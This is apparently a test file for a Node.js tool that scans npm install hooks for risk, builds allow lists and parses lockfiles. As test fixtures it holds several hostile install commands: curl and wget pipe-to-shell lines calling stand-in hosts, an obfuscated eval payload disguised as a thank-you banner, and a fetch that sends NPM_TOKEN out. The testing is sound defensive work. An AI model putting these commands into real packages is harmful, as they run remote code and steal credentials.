import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, writeFile } from "node:fs/promises";
import { readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import { classifyScript, scanTree } from "../src/scan.js";
import { buildAllowList, renderConfig, writeConfig } from "../src/allow.js";
import { checkCooldown, readLockVersions } from "../src/cooldown.js";
import { parseArgs } from "../src/cli.js";

async function fixture() {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-"));
  const add = async (rel, pkg) => {
    const full = path.join(dir, rel);
    await mkdir(full, { recursive: true });
    await writeFile(path.join(full, "package.json"), JSON.stringify(pkg));
  };
  await writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "app", version: "1.0.0" }));
  await add("node_modules/sharp", { name: "sharp", version: "0.33.0", scripts: { install: "node-gyp rebuild" } });
  await add("node_modules/@scope/nag", { name: "@scope/nag", version: "2.0.0", scripts: { postinstall: "node ./opencollective.js" } });
  await add("node_modules/sneaky", { name: "sneaky", version: "1.2.3", scripts: { preinstall: "curl https://evil.example/x.sh | sh" } });
  await add("node_modules/plain", { name: "plain", version: "1.0.0" });
  await add("node_modules/plain/node_modules/nested", { name: "nested", version: "0.1.0", scripts: { postinstall: "node build.js" } });
  return dir;
}

test("classifyScript categorises common install hooks", () => {
  assert.deepEqual(classifyScript("node-gyp rebuild"), { category: "native-build", risk: "medium" });
  assert.equal(classifyScript("curl https://x/y.sh | sh").risk, "high");
  assert.equal(classifyScript("node ./scripts/opencollective.js").category, "funding-nag");
  assert.equal(classifyScript("node build.js").category, "script-exec");
});

test("scanTree finds scoped and nested packages, sorted by risk", async () => {
  const dir = await fixture();
  const findings = await scanTree(dir);
  const names = findings.map((f) => f.name);
  assert.equal(findings.length, 4);
  assert.equal(findings[0].name, "sneaky");
  assert.equal(findings[0].risk, "high");
  assert.ok(names.includes("@scope/nag"));
  assert.ok(names.includes("nested"));
  assert.ok(!names.includes("plain"));
});

test("buildAllowList only allows native builds", async () => {
  const findings = await scanTree(await fixture());
  const { allow, blocked } = buildAllowList(findings);
  assert.deepEqual(allow, ["sharp"]);
  assert.deepEqual(blocked, ["@scope/nag", "nested", "sneaky"]);
});

test("renderConfig emits package-manager specific config", () => {
  const cfg = renderConfig({ allow: ["sharp"] });
  assert.match(cfg.npmrc, /ignore-scripts=true/);
  assert.deepEqual(cfg.packageJson.pnpm.onlyBuiltDependencies, ["sharp"]);
  assert.match(cfg.yarnrc, /enableScripts: false/);
});

test("writeConfig is idempotent and preserves package.json", async () => {
  const dir = await fixture();
  await writeConfig(dir, { allow: ["sharp"] });
  await writeConfig(dir, { allow: ["sharp"] });
  const npmrc = await readFile(path.join(dir, ".npmrc"), "utf8");
  assert.equal(npmrc.match(/ignore-scripts=true/g).length, 1);
  const pkg = JSON.parse(await readFile(path.join(dir, "package.json"), "utf8"));
  assert.equal(pkg.name, "app");
  assert.deepEqual(pkg.pnpm.onlyBuiltDependencies, ["sharp"]);
});

test("readLockVersions parses lockfile v3 entries", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-lock-"));
  await writeFile(
    path.join(dir, "package-lock.json"),
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { name: "app", version: "1.0.0" },
        "node_modules/left-pad": { version: "1.3.0" },
        "node_modules/@scope/tool": { version: "2.1.0", dev: true },
      },
    }),
  );
  const deps = await readLockVersions(dir);
  assert.deepEqual(
    deps.map((d) => `${d.name}@${d.version}`).sort(),
    ["@scope/tool@2.1.0", "left-pad@1.3.0"],
  );
});

test("checkCooldown flags only versions inside the window", async () => {
  const now = new Date("2026-09-05T00:00:00Z");
  const times = {
    fresh: "2026-09-04T00:00:00Z",
    old: "2024-01-01T00:00:00Z",
  };
  const fetchImpl = async (url) => {
    const name = decodeURIComponent(url.split("/").pop());
    return { ok: true, json: async () => ({ time: { "1.0.0": times[name] } }) };
  };
  const flagged = await checkCooldown(
    [
      { name: "fresh", version: "1.0.0" },
      { name: "old", version: "1.0.0" },
    ],
    { days: 7, now, fetchImpl },
  );
  assert.equal(flagged.length, 1);
  assert.equal(flagged[0].name, "fresh");
  assert.equal(flagged[0].ageHours, 24);
});

test("parseArgs handles flags, inline values and defaults", () => {
  assert.deepEqual(parseArgs([]), { command: "scan", flags: {}, positional: [] });
  assert.deepEqual(parseArgs(["cooldown", "--days", "3", "--ci"]), {
    command: "cooldown",
    flags: { days: "3", ci: true },
    positional: [],
  });
  assert.equal(parseArgs(["scan", "--min-risk=high"]).flags["min-risk"], "high");
});

// ---------------------------------------------------------------------------
// v0.2.0: baseline diffing, extra lockfile formats, hardened classifier
// ---------------------------------------------------------------------------

import { toBaseline, diffBaseline, readBaseline, writeBaseline } from "../src/baseline.js";
import { parsePnpmLock, parseYarnLock, parseNpmLock, readAnyLock } from "../src/lockfiles.js";

test("classifyScript flags obfuscation, exfil and pipe-to-shell above everything else", () => {
  assert.equal(classifyScript("curl https://x.example/a.sh | bash").category, "pipe-to-shell");
  assert.equal(classifyScript("wget -qO- http://x/y | sudo sh").risk, "high");
  // A payload dressed up as a funding banner must not be downgraded to 'low'.
  assert.equal(classifyScript("node -e \"eval(atob('ZXZpbA=='))\" # thanks for installing!").risk, "high");
  assert.equal(classifyScript("node -e 'require(\"child_process\").exec(1)'").category, "obfuscated-exec");
  assert.equal(
    classifyScript("node -e \"fetch('https://x.example?t='+process.env.NPM_TOKEN)\"").category,
    "credential-exfil",
  );
  // Legitimate cases keep their existing classification.
  assert.equal(classifyScript("node-gyp rebuild").category, "native-build");
  assert.equal(classifyScript("node ./opencollective.js").category, "funding-nag");
});

test("diffBaseline reports added, changed and removed install scripts", async () => {
  const dir = await fixture();
  const findings = await scanTree(dir);
  const baseline = toBaseline(findings);

  assert.equal(diffBaseline(findings, baseline).added.length, 0);
  assert.equal(diffBaseline(findings, baseline).changed.length, 0);

  // A hijacked release rewrites its own postinstall at a new version.
  const tampered = findings.map((f) =>
    f.name === "sharp"
      ? { ...f, version: "0.33.1", risk: "high", scripts: [{ hook: "install", command: "curl https://evil | sh", category: "pipe-to-shell", risk: "high" }] }
      : f,
  );
  const diff = diffBaseline(tampered, baseline);
  assert.equal(diff.changed.length, 1);
  assert.equal(diff.changed[0].name, "sharp");
  assert.deepEqual(diff.changed[0].reasons.sort(), ["risk", "script", "version"]);

  // A brand new package with a hook shows up as added; a dropped one as removed.
  const withNew = [...findings, { name: "newbie", version: "1.0.0", risk: "medium", scripts: [{ hook: "postinstall", command: "node x.js", category: "script-exec", risk: "medium" }] }];
  assert.equal(diffBaseline(withNew, baseline).added[0].name, "newbie");
  assert.equal(diffBaseline(findings.filter((f) => f.name !== "sneaky"), baseline).removed[0].name, "sneaky");
});

test("baseline round-trips through .installguard.json", async () => {
  const dir = await fixture();
  const findings = await scanTree(dir);
  await writeBaseline(dir, findings);
  const loaded = await readBaseline(dir);
  assert.equal(loaded.version, 1);
  assert.deepEqual(diffBaseline(findings, loaded), { added: [], changed: [], removed: [] });
  assert.equal(await readBaseline(await mkdtemp(path.join(tmpdir(), "empty-"))), null);
});

test("lockfile readers parse npm, pnpm and yarn formats", async () => {
  const npm = parseNpmLock(JSON.stringify({
    lockfileVersion: 3,
    packages: { "": { name: "app" }, "node_modules/lodash": { version: "4.17.21" }, "node_modules/@scope/x": { version: "1.0.0", dev: true } },
  }));
  assert.deepEqual(npm.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/x@1.0.0", "lodash@4.17.21"]);

  const pnpm = parsePnpmLock([
    "lockfileVersion: '6.0'",
    "packages:",
    "  /lodash@4.17.21:",
    "    resolution: {integrity: sha512-x}",
    "  /@scope/pkg@1.2.3(react@18.0.0):",
    "    dev: false",
  ].join("\n"));
  assert.deepEqual(pnpm.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/pkg@1.2.3", "lodash@4.17.21"]);

  const yarn = parseYarnLock([
    "# yarn lockfile v1",
    "",
    'lodash@^4.17.0, lodash@^4.17.21:',
    '  version "4.17.21"',
    '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"',
    "",
    '"@scope/pkg@^1.0.0":',
    '  version "1.2.3"',
  ].join("\n"));
  assert.deepEqual(yarn.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/pkg@1.2.3", "lodash@4.17.21"]);
});

test("readAnyLock picks up a pnpm project and errors clearly when none exists", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "installguard-lock-"));
  await assert.rejects(() => readAnyLock(dir), /no lockfile found/);
  await writeFile(path.join(dir, "pnpm-lock.yaml"), "packages:\n  /left-pad@1.3.0:\n    dev: false\n");
  const found = await readAnyLock(dir);
  assert.equal(found.manager, "pnpm");
  assert.equal(found.lockfile, "pnpm-lock.yaml");
  assert.deepEqual(found.deps, [{ name: "left-pad", version: "1.3.0", dev: false }]);
});
